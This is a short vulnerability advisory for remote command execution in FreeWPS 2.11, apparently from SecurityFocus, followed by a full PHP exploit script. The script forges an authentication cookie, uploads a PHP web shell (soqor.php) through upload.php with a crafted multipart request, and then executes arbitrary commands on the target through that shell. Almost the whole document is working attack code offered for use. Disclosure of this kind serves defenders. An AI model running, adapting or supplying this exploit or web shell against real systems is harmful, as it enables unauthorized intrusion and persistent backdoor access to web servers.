source: http://www.securityfocus.com/bid/20494/info

FreeWPS is prone to a remote command-execution vulnerability. 

Attackers can exploit this issue to execute arbitrary system commands with the privileges of the webserver process.

FreeWPS version 2.11 is vulnerable to this issue; other versions may also be affected.

#!/usr/bin/php -q -d short_open_tag=on
<?
/*
/*   Free WPS Command execution
/*  This exploit should allow you to execute commands
/*            By : HACKERS PAL
/*             WwW.SoQoR.NeT
*/
echo('
/**********************************************/
/*         FreeWPS Command Execution          */
/*    by HACKERS PAL <security@soqor.net>     */
/*         site: http://www.soqor.net         */');
if ($argc<4) {
print_r('
/* --                                         */
/* Usage: php '.$argv[0].' host path cmd
/* Example:                                   */
/*    php '.$argv[0].' localhost /freewps/ id
/**********************************************/
');
die;
}

error_reporting(0);
ini_set("max_execution_time",0);
ini_set("default_socket_timeout",5);
         Function get_page($url)
         {

                  if(function_exists("file_get_contents"))
                  {

                       $contents = file_get_contents($url);

                          }
                          else
                          {
                              $fp=fopen("$url","r");
                              while($line=fread($fp,1024))
                              {
                               $contents=$contents.$line;
                              }


                                  }
                       return $contents;
         }

function connect($packet)
{
  global $host, $port, $html;
    $con=fsockopen(gethostbyname($host),$port);
    if (!$con)
    {
      echo '[-] Error - No response from '.$host.':'.$port; die;
    }
  fputs($con,$packet);
    $html='';
    while ((!feof($con)) or (!eregi(chr(0x0d).chr(0x0a).chr(0x0d).chr(0x0a),$html))) {
      $html.=fread($con,1);
    }
      GLOBAL $html;
  fclose($con);
}

$i=0;
$data="";

function add_data($name,$value,$type="no",$filename)
{
         GLOBAL $data,$i;
if($type=="file")
{
$data.="-----------------------------7d62702f250530
Content-Disposition: form-data; name=\"$filename\"; filename=\"$name\";
Content-Type: text/plain

$value
";
}
elseif($type=="init")
{

$data.="-----------------------------7d62702f250530--";

}
elseif($type=="clean")
{
$data="";
}
else
{
$data.="-----------------------------7d62702f250530
Content-Disposition: form-data; name=\"$name\";
Content-Type: text/plain

$value
";
}


}

$host=$argv[1];
$path=$argv[2];
$cmd=$argv[3];
$port=80;

$cmd=urlencode($cmd);

$p='http://'.$host.':'.$port.$path;

Echo "\n[+] Trying to Upload File";

$cookie="Master=HACKERS20%PAL";
$contents='<?php
$cmd=($_GET[cmd])?$_GET[cmd]:$_POST[cmd];
system($cmd);
?>';

add_data("empty.php","","file","File1");
add_data("soqor.php",$contents,"file","File2");
add_data("soqor.php",$contents,"file","File3");
add_data('','',"init");

$packet="POST ".$p."upload.php?&-269001946=1&-834358190=1 HTTP/1.0\r\n";
$packet.="Accept: image/gif, image/x-xbitmap, image/jpeg, image/pjpeg, application/x-shockwave-flash, */*\r\n";
$packet.="Referer: http://".$host.$path."profile.php?mode=editprofile\r\n";
$packet.="Accept-Language: it\r\n";
$packet.="Content-Type: multipart/form-data; boundary=---------------------------7d62702f250530\r\n";
$packet.="Accept-Encoding: gzip, deflate\r\n";
$packet.="User-Agent: Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1)\r\n";
$packet.="Host: ".$host."\r\n";
$packet.="Content-Length: ".strlen($data)."\r\n";
$packet.="Connection: Close\r\n";
$packet.="Cache-Control: no-cache\r\n";
$packet.="Cookie: ".$cookie."\r\n\r\n";
$packet.=$data;
connect($packet);

if (eregi("Successfully uploaded <soqor.php>",$html))
{
   echo "\n[+] Successfully uploaded ...\n[+] Go To http://".$host.$path."upload/soqor.php?cmd=$cmd for your own commands.. \n[+] The 
Result Of The Command\n";
      Echo get_page($p."upload/soqor.php?cmd=".$cmd);
}
else
{
   echo "\n[-] Unable to Upload File\n[-] Exploit Failed";
}
   echo ("\n/*         Visit us : WwW.SoQoR.NeT           */\n/**********************************************/");
?>
